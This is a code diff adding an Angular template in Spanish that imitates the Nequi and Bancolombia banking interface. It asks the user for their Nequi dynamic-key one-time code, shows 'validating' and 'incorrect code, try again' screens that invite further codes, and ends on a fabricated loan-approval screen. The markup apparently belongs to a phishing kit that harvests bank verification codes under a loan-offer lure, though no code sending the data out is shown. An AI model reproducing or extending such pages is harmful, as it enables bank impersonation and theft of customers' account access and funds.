@@ -1,0 +1,105 @@
+@switch (estado()) {
+
+@case ('otp') {
+<section class="screen">
+    <header class="top">
+        <img class="logo" src="assets/logo.png">
+        <h1>Confirma tu identidad</h1>
+        <p class="subtitulo">
+            Escribe el código de {{ largo }} dígitos de tu clave dinámica de Nequi para continuar.
+        </p>
+    </header>
+
+    <main>
+        <div class="casillas" role="group" aria-label="Código de verificación">
+            @for (i of casillas; track i) {
+            <div class="casilla">
+                @if (digitos()[i] !== undefined) {
+                <span class="asterisco">*</span>
+                }
+            </div>
+            }
+        </div>
+
+        <p class="intentos">
+            Intentos restantes: <strong>{{ intentosRestantes() }}</strong> de {{ maxIntentos }}
+        </p>
+
+        <div class="teclado">
+            @for (tecla of teclas; track tecla) {
+            <button type="button" class="tecla" (click)="agregar(tecla)">{{ tecla }}</button>
+            }
+
+            <span></span>
+
+            <button type="button" class="tecla" (click)="agregar('0')">0</button>
+
+            <button type="button" class="tecla" aria-label="Borrar" (click)="borrar()">
+                <svg viewBox="0 0 38 36" width="29" height="28" aria-hidden="true">
+                    <path fill="#200020" d="M14 1h21a2 2 0 0 1 2 2v30a2 2 0 0 1-2 2H14L1 18 14 1z" />
+                    <path stroke="#fff" stroke-width="2.4" stroke-linecap="round" d="M19 14l7 7M26 14l-7 7" />
+                </svg>
+            </button>
+        </div>
+    </main>
+</section>
+}
+
+@case ('cargando') {
+<section class="cargando" aria-live="polite" aria-label="Validando">
+    <img src="assets/loading-original.webp" alt="">
+    <p>Validando tu código...</p>
+</section>
+}
+
+@case ('error-intento') {
+<section class="aviso">
+    <h2>Código incorrecto</h2>
+    <p>
+        El código que ingresaste no es correcto. Te quedan
+        <strong>{{ intentosRestantes() }}</strong> intento(s).
+    </p>
+    <button type="button" class="btn-reintentar" (click)="reintentar()">
+        Intentar nuevamente
+    </button>
+</section>
+}
+
+@case ('felicitaciones') {
+<section class="pantalla-felicitaciones">
+    <div class="card">
+        <div class="check-circle"></div>
+        <h1>¡Felicidades!</h1>
+        <p class="subtitle">
+            Tu crédito ha sido aprobado exitosamente. En breve recibirás el dinero
+            en tu cuenta Nequi.
+        </p>
+
+        <div class="details">
+            <div class="row">
+                <span class="label">Monto aprobado</span>
+                <span class="value">{{ montoAprobado() }}</span>
+            </div>
+            <div class="row">
+                <span class="label">Plazo</span>
+                <span class="value">{{ plazoAprobado() }}</span>
+            </div>
+            <div class="row">
+                <span class="label">Cuota mensual</span>
+                <span class="value">{{ cuotaAprobada() }}</span>
+            </div>
+            <div class="row">
+                <span class="label">Tasa de interés</span>
+                <span class="value">{{ tasaAprobada() }}</span>
+            </div>
+        </div>
+
+        <button type="button" class="btn-primary" (click)="continuar()">
+            Continuar
+        </button>
+    </div>
+
+    <footer>Bancolombia S.A. - Todos los derechos reservados</footer>
+</section>
+}
+}
